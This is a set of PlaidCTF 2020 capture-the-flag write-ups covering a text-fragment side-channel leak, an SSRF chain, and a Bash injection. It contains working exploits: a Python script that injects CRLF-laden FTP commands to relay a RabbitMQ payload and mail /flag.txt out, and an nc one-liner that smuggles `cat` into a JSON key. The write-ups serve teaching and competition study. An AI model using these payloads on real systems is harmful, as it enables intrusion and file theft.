## Web

### Catelog (not solved)

Problem Details:

```
[Hereâ€™s the site](http://catalog.pwni.ng/). The flag is on [this page](http://catalog.pwni.ng/issue.php?id=3).

Browser: Chromium with uBlock Origin 1.26.0 installed and in its default configuration

Flag format: /^PCTF\{[A-Z0-9_]+\}$/

Hints:
* To view your post, the admin will click on a link on the admin page.
* You might want to read up on User Activation.
* The intended solution does not require you to submit hundreds of captchas.

**Hint: Admin Bot Timeout**

The admin bot will always disconnect after about 30 seconds.
```

The challenge is about exploiting Chrome's [Scroll To Text Fragment](https://www.chromestatus.com/feature/4733392803332096) to leak data with lazy-loading images `<img loading="lazy">`. The uBlock Origin is intended to be used to duplicate the user activation to trigger multiple text fragment leakage. See [@lbherrera_](https://twitter.com/lbherrera_/status/1251994130298875904)'s partial solver for more details.

The author [@thebluepichu](https://twitter.com/thebluepichu) (I think so?) said in the IRC channel:

Catalog has two injections: the image tag on the issue page and the username when you fail to login. Use the image tag one with a meta redirect to get offsite. Hint 1 + inclusion of uBlock: admin clicks on a link which gives a user activation to the active frame, uBlock sends a postMessage to its extension iframe, which duplicates the user activation. Whenever a page loads, the frontend gets a postMessage from the uBlock frame, and thus duplicates the activation back again. Now make a no-cors POST to use the failed login injection, then send them to issue.php?id=3. So now we have arbitrary content with a user activation on the correct page, but still no code exec.

Ok, but what can we do? A recent addition to Chromium was scroll-to-text-fragment, which lets you search the page for text (in entire words only) and scroll to it, though this consumes the user activation. If you could search for a letter at a time, then you could use your injection to add a bunch of whitespace and a lazy-loading image to detect the scroll. It turns out you can: the whole-word match counts tag boundaries as word boundaries, and the `<em>` tag gets split into a `<span>` for each individual letter on load! So you can do text searches of the form #:~:text=F-,{,-X for example to search for an X at the beginning of the flag. You can specify multiple text searches to do a binary search across the whole alphabet. Also include a meta refresh to send back offsite again after a short delay and you can leak ~5 characters per captcha. Repeat 5 or 6 times to get the whole flag.


### Contrived Web Problem

> bookgin

This write-up is intended to be lengthy. The challenge itself is not that difficult, but I would like to share more about how I make progress and come out with next step.

This contrived challenge has 6 services in the dockerfile:

1. postgres: database backend
2. rabbit: rabbitmq server serves as an email queue
3. ftp: ftp server stores user's profile images
4. frontend server: the web server frontend; most are static files.
5. backend api: the web server backend handling most of the logic. The frontend server will proxy the route `/api` to this backend api server.
6. email: email server will fetch email task from rabbit.

The flag file `/flag.txt` are present in frontend server, email and backend api. This is very important because it's not much useful to exploit the server without flag.

#### The Weapon: SSRF

Because backend api handles the logic, We start from this service first. A quick look on the source we quickly identify a SSRF vulnerability:

```
/api/image?url=ftp://ftp:21/user/975b893d-7b0e-4091-8356-46b24fa43818/profile.png
```

The source code snippet:

```javascript=
        let parsed = new URL(url);

        let image: Buffer;
        if (parsed.protocol === "http:" || parsed.protocol === "https:") {
            const imageReq = await fetch(parsed.toString(), { method: "GET" }); 
            image = await (imageReq as any).buffer();
        } else if (parsed.protocol === "ftp:") {
            let username = decodeURIComponent(parsed.username);
            let password = decodeURIComponent(parsed.password);
            let filename = decodeURIComponent(parsed.pathname);
            let ftpClient = await connectFtp({
                host: parsed.hostname,
                port: parsed.port !== "" ? parseInt(parsed.port) : undefined,
                user: username !== "" ? username : undefined,
                password: password !== "" ? password : undefined,
            }); 
            image = await ftpClient.get(filename);
        } else {
            return res.status(500).send("Bad image url");
        } 

        if (!isPNG(image)) {
            return res.status(500).send("Bad image (not a png)");
        }

        res.type(".png").status(200).send(image);
```

Since those services are in LAN, the SSRF vulnerability is very useful. WE can simply use SSRF to smuggle protocol to any of the service.

However, the SSRF here is not that powerful. Regarding HTTP-based SSRF, the library is use `isomorphic-fetch`, which depends on `node-fetch`. We can't do much by simply controlling URL here, and we didn't find any CRLF in the library either. What's worse the HTTP method is limited in GET. Smuggling the payload in POST body is not possible. For GET, non-printable characters will be percent-encoded.

For FTP-based SSRF, the problem is FTP is a stateful protocol. Unlike HTTP protocol, in FTP the server has to greet the client first `200 OK\r\n` and then the client will proceed to send the username information `USER anonymous\r\n`.

In other words, even though we can control the destination host, unless the victim server sends something first, the TCP connection will just idle there. Both server and client are awaiting each other.

#### Identify the Target

Even with limited SSRF capability, let's identify possible targets. By default RabbitMQ has [multiple open ports](https://www.rabbitmq.com/networking.html).

1. postgres 5432: but we have no idea of the database name, username, password.
2. rabbit 4369: EPMD protocol. [a peer discovery service used by RabbitMQ nodes and CLI tools](https://www.rabbitmq.com/networking.html), but it doesn't seem to be useful
3. rabbit 5672: AMQP protocol. When the backend api adds a new email, it will communicate with this port. This could be exploitable.
4. rabbit 15672: HTTP management server for rabbitMQ. The HTTP API is using HTTP Basic Auth so it's very suitable for our SSRF target.
5. rabbit 25672: Erlang distribution server port. It seems like it's used by [internal CLI tools](https://www.rabbitmq.com/networking.html), and we don't think it's interesting.
6. ftp 21: The flag is not in FTP server. Even if we can retrieve files from FTP, it's not much useful.
7. frontend server: there is no reason to exploit the server from internal network. We can connect all API from WAN.
8. backend api: there is no reason to exploit the server from internal network. We can connect all API from `/api` via frontend server.
9. email: there is no listening port.

So the most promising target is rabbitmq, but let's recall the flag path again because not all servers have flag file. The flag file `/flag.txt` are present in frontend server, email and backend api. rabbitmq has no flag.

But don't forget rabbitmq servers as the email queue. If we can poison or inject some data into rabbitmq, we can make the email server send something out. Let's dive in the source code of email server first:

```javascript=
    let channel = await rabbit.createChannel();
    channel.consume("email", async (msg) => {
        if (msg === null) {
            return;
        } 
        channel.ack(msg);

        try {
            let data = JSON.parse(msg.content.toString());
            await transport.sendMail({
                from: "plaid2020problem@gmail.com",
                subject: "Your Account",
                ...data,
            }); 
        } catch (e) {
            console.error(e);
        } 
    })
```

The triple dot is called [Spread syntax](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Spread_syntax). Basically if we can inject the data into rabbitmq, we can control the object. In the [`transport.sendMail` document](https://nodemailer.com/message/), we can insert `attachments` and `to` to exfiltrate any file to our mail account in the email server.

Does it ring a bell? The email server contains the flag!

#### Make SSRF Great Again with Active FTP

The idea is clear now: use SSRF to poison the data `{to: "email@example.com", attachments:[{path:"/flag.txt"}]}`into rabbitmq, and just check the flag in the email.

However, either rabbitmq AMQP protocol or rabbitmq HTTP API requires pretty complicated payload to exploit. This is definitely not doable via HTTP-based SSRF.

The only hope, FTP-based SSRF, requires the remote server to send something first. Both AMQP and HTTP API won't greet the client first.

Which protocol greet the client? Of couse, the FTP server itself. Can we leverage ftp server to sharpen our SSRF?

FTP server has 2 modes, active and passive mode respectively. [This website](https://slacksite.com/other/ftp.html#actexample) explains them clearly with raw payload.

To sum up:

In active mode:
- Download (RETR): the client specifies IP and the server sends the file to it.
- Upload (STOR): the client specifies IP and the server retrieves the file from it.

In passive mode:
- Download (RETR): the server specifies IP and the client retrieves the file from it.
- Upload (STOR): the server specifies IP and the client sends the file to it.

Therefore only active download or passive upload can work here. For passive upload, because the vulnerable SSRF command for client is download (STOR), the client will not initial the connection to the IP.

But for active download, if we can make the FTP client specify the SSRF target and send RETR, the server will send the file to the target.

The [ftp-client](https://github.com/mscdex/node-ftp) is vulnerable to CRLF injections. We can easily craft a payload to trick the server to send `test.txt` to `127.0.0.1:1024`.

```
await ftp_client.get("foo\r\nbar\r\nPORT 127,0,0,1,4,0\r\nRETR test.txt\r\n");
```

When uploading file, the server will check whether the first a few bytes starts with PNG header. This can be easily bypassed via FTP active download. The following payload will track the server to download `255.255.255.255:1024` and save to `test.txt`. (It seems like some teams didn't bypass this but still managed to solve the challenge.)

```
await ftp_client.get("foo\r\nbar\r\nPORT 255,255,255,255,4,0\r\nSTOR text.txt\r\n");
```

Okay, we have a relatively powerful SSRF now. There is no need to smuggle any protocol. We can send any TCP content we want!

#### Craft the SSRF Payload

We have two options here:

1. rabbit 5672: AMQP protocol
2. rabbit 15672: HTTP management server for rabbitMQ.

We choose the first one. The AMQP protocol seems to be required interaction, but it can still work when I just record and replay all the payload together. For option 2 you can refer to other [write-ups in CTFTime](https://ctftime.org/task/11323).

We use wireshark to record the payload to rabbit port 5672.

```

Replay the payload will insert `{"to":"balsnctf@example.com","text":"PWNED","attachments":[{"path":"/flag.txt"}]}` into rabbitmq. It has a low probability to fail to insert a new record.

Here is the script:

```python
#!/usr/bin/env python3
import requests, secrets, base64, re
from urllib.parse import quote

s = requests.session()

u = 'http://contrived.pwni.ng/api/'
try:
    r = s.get(u+'image', params=dict(url="ftp://ftp:21/"+quote("foo\r\nbar\r\nPORT 255,255,255,255,4,0\r\nSTOR /http.txt\r\n")), timeout=5)
except Exception as e:
    print(e)
try:
    r = s.get(u+'image', params=dict(url="ftp://ftp:21/"+quote("foo\r\nbar\r\nPORT 172,32,56,72,22,40\r\nRETR /http.txt\r\n")), timeout=5)
except Exception as e:
    print(e)
```

Check the email and profit!

By the way, I spent 2+ hours on debugging only to find out I type the incorrect internel IP address......

### Mooz Chat (not solved)

See [@pastenctf](https://twitter.com/pastenctf)'s writeup [here](https://github.com/koolkdev/ctf-writeups/tree/master/plaid2020/mooz-chat). Part 1 is about Go reversing + command injection. Part 2 is WebRTC + MitM  Diffie-Hellman.

## Misc

### JSON Bourne

This is a Bash command injection challenge. Quickly browse the code and find this interesting:

```bash
    for (( task_i=0; task_i < ${#result_str}; task_i++ )); do
        if [[ "${result_str:$task_i:5}" = "task " ]]; then
            local suffix="${result_str:$((task_i+5)):$((${#result_str}-task_i-5))}"
            if [[ "$((suffix > 0))" = "1" && "$((suffix <= 8))" = "1" ]]; then
                local color=$var_name
                normalizeNumber "$suffix" $color "var_"
                eval ${res}'[_color]=${color}'
            fi
        fi
    done
```

So if we have string prefixed with `task`, the `$suffix` will become the word after it.

Example:

```
{"task abc":""}

$suffix = "abc"

if [[ ""$(("abc" > 0))"" ...
```

This is the most promising injection point, but even the [Indirect Variable References](https://www.tldp.org/LDP/abs/html/ivr.html#IVRREF) is not able to achieve command injection here. With this syntax we can retrieve environment variable at most.

```
{"task PATH":""}

./parser.sh: line 21: /usr/local/bin:/usr/local/sbin:/usr/bin:/usr/lib/jvm/default/bin:/usr/bin/site_perl:/usr/bin/vendor_perl:/usr/bin/core_perl: syntax error: operand expected (error token is "/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/lib/jvm/default/bin:/usr/bin/site_perl:/usr/bin/vendor_perl:/usr/bin/core_perl")
```

The `$((suffix > 0 ))`is instriguing. Then I write a simple fuzzer to try to solve it:

```python
#!/usr/bin/env python3
import subprocess
from itertools import product
seed = [
    '"',
    'yes',
    '`yes`',
    '(',
    '$',
    '[',
    ']',
    ')',
    '',
    ':',
    ' ',
    "'",
    "0",
    "1",
    '='
]
for p in product(seed, seed, seed, seed):
    p = ''.join(p)
    if 'yes' not in p:
        continue
    p = '{' + f'"task 1":"task _var_name_{p}","`yes`":"task var_15=13"' + '}'
    print(repr(p))
    s = subprocess.run(['./pprint.sh'], input=p.encode(), capture_output=True)
    print(s)

'''
echo '{"task 1":"task _var_name_yes[`cat$IFS*`]","`cat$IFS*`":"task var_15=13"}' | nc json.bourne.pwni.ng 1337 | grep PCTF
./parser.sh: line 20: PCTF{the_bourne_identity_crisis}
'''
```

The payload is simply using `[]` to perform injection. It seems like `[]` will get interpret again.

```json
{"task foo[`cat *`]":""}
```

You can also use double reference to solve this. Refer to [mhackeroni team's write-up in CTFTime](https://ctftime.org/writeup/20099).

Heuristic-based fuzzing is pretty useful, isn'it :)?
